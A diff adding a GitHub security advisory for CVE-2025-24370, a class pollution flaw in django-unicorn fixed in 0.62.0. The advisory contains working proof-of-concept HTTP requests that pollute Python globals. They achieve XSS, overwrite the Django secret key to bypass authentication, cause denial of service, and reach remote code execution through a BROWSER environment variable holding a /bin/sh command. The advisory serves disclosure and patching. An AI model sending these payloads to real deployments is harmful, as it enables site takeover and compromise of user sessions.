@@ -1,0 +1,165 @@
+{
+  "id": "GHSA-g9wf-5777-gq43",
+  "modified": "2025-05-08T15:03:48.501Z",
+  "published": "2025-02-03T15:48:53Z",
+  "aliases": [
+    "CVE-2025-24370"
+  ],
+  "summary": "Django-Unicorn Class Pollution Vulnerability, Leading to XSS, DoS and Authentication Bypass",
+  "details": "# Summary\n\nDjango-Unicorn is vulnerable to python class pollution vulnerability, a new type of vulnerability categorized under [CWE-915](https://cwe.mitre.org/data/definitions/915.html). The vulnerability arises from the core functionality `set_property_value`, which can be remotely triggered by users by crafting appropriate component requests and feeding in values of second and third parameter to the vulnerable function, leading to arbitrary changes to the python runtime status. \n\nAt least five ways of vulnerability exploitation have been found, stably resulting in Cross-Site Scripting (XSS), Denial of Service (DoS), and Authentication Bypass attacks in almost every Django-Unicorn-based application.\n\n# Analysis of Vulnerable Function\n\nBy taking a look at the vulnerable function `set_property_value` located at: `django_unicorn/views/action_parsers/utils.py`. You can observe the functionality is responsible for modifying a property value of an object. \n\nThe property is specified by a dotted form of path at the second parameter `property_name`, where nested reference to object is supported, and base object and the assigned value is given by the first parameter `component` and third parameter `property_value`.\n\n```python\n# https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/views/action_parsers/utils.py#L10\ndef set_property_value(\n    component,\n    property_name,\n    property_value\n) -\u003e None:\n    ...\n    property_name_parts = property_name.split(\".\")\n    component_or_field = component\n    ...\n    for idx, property_name_part in enumerate(property_name_parts):\n        if hasattr(component_or_field, property_name_part):\n            if idx == len(property_name_parts) - 1:\n                ...\n                setattr(component_or_field, property_name_part, property_value)\n                ...\n            else:\n                component_or_field = getattr(component_or_field, property_name_part)\n                ...\n        elif isinstance(component_or_field, dict):\n            if idx == len(property_name_parts) - 1:\n                component_or_field[property_name_part] = property_value\n\t\t\t\t...\n            else:\n                component_or_field = component_or_field[property_name_part]\n\t\t\t\t...\n        elif isinstance(component_or_field, (QuerySet, list)):\n            property_name_part_int = int(property_name_part)\n\n            if idx == len(property_name_parts) - 1:\n                component_or_field[property_name_part_int] = property_value  # type: ignore[index]\n                ...\n            else:\n                component_or_field = component_or_field[property_name_part_int]  # type: ignore[index]\n                ...\n        else:\n            break\n```\n\nMeanwhile, this functionality can be directly triggered by a component request, one of the core functionalities of the project, by specifying the request type as `syncInput` and payload object would be fed in the dotted-path (2nd) parameter and assigned value (3rd) parameter of the vulnerable function.\n\n```json\nPOST /unicorn/message/COMPONENT_NAME\n\n{\n    \"id\": 123,\n    \"actionQueue\":[\n        {\n          \"type\": \"syncInput\",\n          \"payload\": {\n          \"name\": \"DOTTED_PATH\",\n          \"value\":\"ASSIGNED_VALUE\"\n          }\n    \t\t}\n    ],\n    \"data\": {XXX},\n    \"epoch\": \"123\",\n    \"checksum\": \"XXXX\"\n}\n```\n\nYou are now aware of that users from the remote can fully control the `property_name` and `property_value` of the vulnerable function. By default the preperty value overwrite can only be performed on the component object, which is always the first parameter of the function.\n\nHowever, the functionality failed to count in the situation where bad actors can modify the normal path to traverse to other objects in the python runtime, by leveraging the **magic attributes**. For example, if the `property_name` was set to `__init__.__globals__`, the component context would change to global context of the component module, which means you can modify any attributes of the objects that are located in the global scope of the component module. These objects also include other modules that have been imported in the component module, which comprises of a pollutable dependency chain.\n\nWith all these techniques introduced, you can now change any global objects including, global variables/instances/classes/functions of any module that is in a chain of dependency from the component module.\n\nThe next section introduces the five exploitation gadgets found so far, leading to reflected XSS, stored XSS, authentication bypass and DOS attack. It uses a locally deployed `django-unicorn.com` as demo website to showcase its large-scale impact.\n\n\u003e Here, gadgets refer to the dependency code snippets by default introduced by django-unicorn and changing its status can result in an attack sequence, such as XSS.\n\n# Proof of Concept\n\n## #1 Reflected Cross-Site Scripting by Overwriting bs4 HTML sanitizer\n\nDjango-Unicorn implants the `EntitySubstitution` rule from beautifulsoup4 library into its [HTML formatter](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/components/unicorn_template_response.py#L125), formatting all the template response messages.\n\n![image-20250121163510422](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-35-11-a1aa5cfa196383e3a26636eb80bd85f0.png)\n\nWhile [this rule](https://github.com/akalongman/python-beautifulsoup/blob/master/bs4/dammit.py#L79) is specified in a global dictionary, you can exploit the class pollution vulnerability to overwrite it.\n\n```http\nPOST /unicorn/message/todo HTTP/1.1\n\n{\n  \"id\": 123,\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.\u003c\",\n        \"value\": \"\u003cimg/src=1 onerror=alert('bs4_html_entity_bypass')\u003e\"\n      }\n    }\n  ],\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"epoch\": \"123\",\n  \"checksum\": \"XXX\"\n}\n```\n\nIn this demonstration, replaced the sanitizer's `\u003c` item value with the XSS payload. whenever a template reponse renders a \"\u003c\" in cleartext, it will be converted to the payload, leading to XSS attack.\n\n![bs4-xss](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-40-56-5ecbe8f2d39a6cc9a546744ca995b2d9.gif)\n\n## #2 Stored Cross-Site Scripting by Overwriting Unicorn Setting and [Django](https://github.com/django/django) Json Script Sanitizer\n\nThere is always a script tag in the webpage. Among it, a `NAME` value is dynamically extracted both from the `MORPHER_NAMES` and `DEFAULT_MORPHER_NAME` variable in the [setting module](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/settings.py#L12). \n\n![image-20250121165007647](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-50-08-f2a628f8d06ba81c9bb71f78766cecb7.png)\n\nHowever, simply polluting these values can not lead to a stored XSS attack. Django by default escape some of the special characters into unicode sequences.\n\n![image-20250121164947336](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-49-47-b756d516b0b3e3d025d876963e1dbf6a.png)\n\nGoing through the source code of django, you will find the actual sanitizer located at `_json_script_escapes` variable at [django/utils/html.py](https://github.com/django/django/blob/862b7f98a02b7973848db578ff6d24ec8500fdb4/django/utils/html.py#L84).\n\n![image-20250121165247245](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-52-47-b60cd91f46ed89bc7b0a4b3f68521827.png)\n\nBy polluting this variable to clear it out, you finally achieve a stored XSS attack.\n\n![image-20250121165839892](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-58-40-97608fc15544d68edbfbdc8e61744b12.png)\n\nPoC:\n\n```http\nPOST /unicorn/message/todo HTTP/1.1\n\n{\n  \"id\": \"3gpDSUcxzs1\",\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"checksum\": \"XXX\",\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.django_unicorn.settings.MORPHER_NAMES\",\n        \"value\": [\n          \"\u003c/script\u003e\u003cscript\u003ealert('django json unicode escape bypass + configuration overwrite')\u003c/script\u003e\"\n        ]\n      }\n    },\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.django_unicorn.settings.DEFAULT_MORPHER_NAME\",\n        \"value\": \"\u003c/script\u003e\u003cscript\u003ealert('django json unicode escape bypass + configuration overwrite')\u003c/script\u003e\"\n      }\n    },\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.django.utils.html._json_script_escapes\",\n        \"value\": {}\n      }\n    }\n  ],\n  \"epoch\": 1737318956605,\n  \"hash\": \"jWGuTFzy\"\n}\n```\n\n![json_unicode_xss](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-58-59-f8da2463bbaa8de4f305c6fd2235172b.gif)\n\n## #3 Stored Cross-Site Scripting by Overwriting [Django](https://github.com/django/django) Error Page Source Code\n\nDjango by default stores its error page source code in a global variable named `ERROR_PAGE_TEMPLATE` at [django/views/defaults.py](https://github.com/django/django/blob/main/django/views/defaults.py#L16). \n\n![image-20250121170357900](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-03-58-86c9cf2abfa28f0e1ed479521af5be2e.png)\n\nBy polluting this variable to XSS payload. whenever a user triggers an error in the application, such as access an unexisting resource, the attack payload fires out.\n\n```http\nPOST /unicorn/message/todo HTTP/1.1\n\n{\n  \"id\": 123,\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.django.views.defaults.ERROR_PAGE_TEMPLATE\",\n        \"value\": \"\u003chtml\u003e\u003cscript\u003ealert('error page pollution')\u003c/script\u003e\u003c/html\u003e\"\n      }\n    }\n  ],\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"epoch\": \"123\",\n  \"checksum\": \"XXX\"\n}\n```\n\n![django-404-xss](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-05-05-e6ce889e7549243a5d8a60877fbb8cff.gif)\n\n## #4 Authentication Bypass by Overwriting [Django](https://github.com/django/django) Secret Key \n\nDjango secret key is typically used to sign and verify session cookies and other security related mechanism. By polluting its runtime value to attacker intended, attacker can forge session cookies to login in to the system as any user.\n\nEven though, django-unicorn.com doesn't have an authentication layer, you can still observe a successful secret key pollution by inspecting the changed checksum in the HTTP response, since the checksum is generated by encrypting the data field in the request body with the secret key.\n\n```HTTP\nPOST /unicorn/message/todo HTTP/1.1\n\n{\n  \"id\": 123,\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY\",\n        \"value\": \"test\"\n      }\n    }\n  ],\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"epoch\": \"123\",\n  \"checksum\": \"XXX\"\n}\n```\n\n![authentication_bypass](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-12-20-424da7c5c960471600863828fba93c4a.gif)\n\n## #5 Denial of Service by Overwriting `timed` Decorator Method\n\nThe [timed](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/decorators.py#L9) decorator is used to modify many important functions in the django-unicorn, such as [_call_method_name](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/views/action_parsers/call_method.py#L122).\n\n![image-20250121171823756](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-18-24-0e1cec22199ab2dc1bc9bbcb76d2dcd9.png)\n\nBy polluting the core decorator method `timed`  to a string, you make a function call always call a uncallable string, leading to the backend crashed, thus denial of service attack.\n\n```http\nPOST /unicorn/message/todo HTTP/1.1\n\n{\n  \"id\": 123,\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.timed\",\n        \"value\": \"X\"\n      }\n    }\n  ],\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"epoch\": \"123\",\n  \"checksum\": \"XXX\"\n}\n```\n\n![dos_attack](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-20-39-20ab579669a459c7fb54afeab21dcd4e.gif)\n\n## #6 Remote Code Execution by Polluting `location_cache` and OS Environment Variable `BROWSER`\n\nBy polluting the cached data in the `location_cache` object located at [unicorn_view.py](https://github.com/adamghill/django-unicorn/blob/ba2e1de5858f65b7d115f2ba782c220addd47245/django_unicorn/components/unicorn_view.py#L42C1-L43C1), attackers can archieve an arbitrary module importation as the logic executed at [_get_component_class](https://github.com/adamghill/django-unicorn/blob/ba2e1de5858f65b7d115f2ba782c220addd47245/django_unicorn/components/unicorn_view.py#L835) function. Then a following pollution on the `BROWSER` os environment variable will lead to remote code execution when it is combined with `antigravity` module importation.\n\n- Pollute `location_cache._Cache__data.todo` as an array where the first element is the module name imported whenever a `GET` request is sent to the server. \n```HTTP\nPOST /unicorn/message/todo HTTP/1.1\nHost: proof-of-concept:2334\nContent-Length: 327\nAccept: application/json\n\n{\n  \"id\": \"E5FBWqME\",\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"checksum\": \"XvvsDQXX\",\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.location_cache._Cache__data.todo\",\n        \"value\": [\n          \"antigravity\",\n          \"any\"\n        ]\n      },\n      \"partials\": []\n    },\n    {\n      \"type\": \"callMethod\",\n      \"payload\": {\n        \"name\": \"add\"\n      },\n      \"partials\": []\n    }\n  ],\n  \"epoch\": 1746680343776,\n  \"hash\": \"CG5pMDxc\"\n}\n```\n\n- Pollute `BROWSER` os environment variable where the payload for command injection is set.\n```HTTP\nPOST /unicorn/message/todo HTTP/1.1\nHost: proof-of-concept:2334\nContent-Length: 348\nAccept: application/json\n\n{\n  \"id\": \"E5FBWqME\",\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"checksum\": \"XvvsDQXX\",\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.os.environ\",\n        \"value\": {\n          \"BROWSER\": \"/bin/sh -c \\\"touch /tmp/pwned \\\" #%s\"\n        }\n      },\n      \"partials\": []\n    },\n    {\n      \"type\": \"callMethod\",\n      \"payload\": {\n        \"name\": \"add\"\n      },\n      \"partials\": []\n    }\n  ],\n  \"epoch\": 1746680343776,\n  \"hash\": \"CG5pMDxc\"\n}\n```\n\n![django-unicorn-rce](https://github.com/user-attachments/assets/8ad88609-c399-4852-8dd4-7fbc59cb28ae)\n\n# Mitigation\n\nThe patch could be:\n\n- Blocking paths that start with `__`,  which represent **double under (dunder)** or **magic variables/methods**\n- Set a blacklist for the path, such as `RESTRICTED_KEYS = (\"__globals__\", \"__builtins__\")` adopted by [pydash](https://github.com/dgilland/pydash/blob/f4112f61ddb02e5181e781709d775838c9978b97/src/pydash/helpers.py#L211).\n\n# Related Materials\n\nFor more information about class pollution please refer to:\n\n[1] [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)\n\n[2] [Report: Class Pollution leading to RCE in pydash](https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca)\n\n[3] [Blog: Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)\n\n[4] [Blog: Class Pollution Gadgets in Jinja Leading to RCE](https://www.offensiveweb.com/docs/programming/python/class-pollution/)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "django-unicorn",
+        "purl": "pkg:pypi/django-unicorn"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.62.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.10.0",
+        "0.10.1",
+        "0.11.0",
+        "0.11.1",
+        "0.11.2",
+        "0.12.0",
+        "0.13.0",
+        "0.14.0",
+        "0.14.1",
+        "0.15.0",
+        "0.15.1",
+        "0.16.0",
+        "0.16.1",
+        "0.17.0",
+        "0.17.1",
+        "0.17.2",
+        "0.18.0",
+        "0.18.1",
+        "0.19.0",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.20.0",
+        "0.21.0",
+        "0.21.2",
+        "0.22.0",
+        "0.23.0",
+        "0.24.0",
+        "0.25.0",
+        "0.26.0",
+        "0.27.0",
+        "0.27.1",
+        "0.27.2",
+        "0.28.0",
+        "0.29.0",
+        "0.3.0",
+        "0.30.0",
+        "0.31.0",
+        "0.32.0",
+        "0.33.0",
+        "0.34.0",
+        "0.35.0",
+        "0.35.2",
+        "0.35.3",
+        "0.36.0",
+        "0.36.1",
+        "0.37.0",
+        "0.37.1",
+        "0.37.2",
+        "0.38.0",
+        "0.38.1",
+        "0.39.0",
+        "0.39.1",
+        "0.4.0",
+        "0.40.0",
+        "0.41.0",
+        "0.41.1",
+        "0.41.2",
+        "0.42.0",
+        "0.42.1",
+        "0.43.0",
+        "0.43.1",
+        "0.44.0",
+        "0.44.1",
+        "0.45.0",
+        "0.45.1",
+        "0.46.0",
+        "0.47.0",
+        "0.48.0",
+        "0.49.0",
+        "0.49.1",
+        "0.49.2",
+        "0.5.0",
+        "0.50.0",
+        "0.51.0",
+        "0.51.1",
+        "0.52.0",
+        "0.53.0",
+        "0.54.0",
+        "0.55.0",
+        "0.56.0",
+        "0.56.1",
+        "0.57.0",
+        "0.57.1",
+        "0.58.0",
+        "0.58.1",
+        "0.59.0",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.6.4",
+        "0.6.5",
+        "0.60.0",
+        "0.61.0",
+        "0.7.0",
+        "0.7.1",
+        "0.8.0",
+        "0.9.0",
+        "0.9.1",
+        "0.9.2",
+        "0.9.3",
+        "0.9.4"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-g9wf-5777-gq43/GHSA-g9wf-5777-gq43.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-24370"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/adamghill/django-unicorn/commit/17614200f27174f789d4af54cc3a1f2b0df7870c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/adamghill/django-unicorn"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/adamghill/django-unicorn/releases/tag/0.62.0"
+    }
+  ]
+}
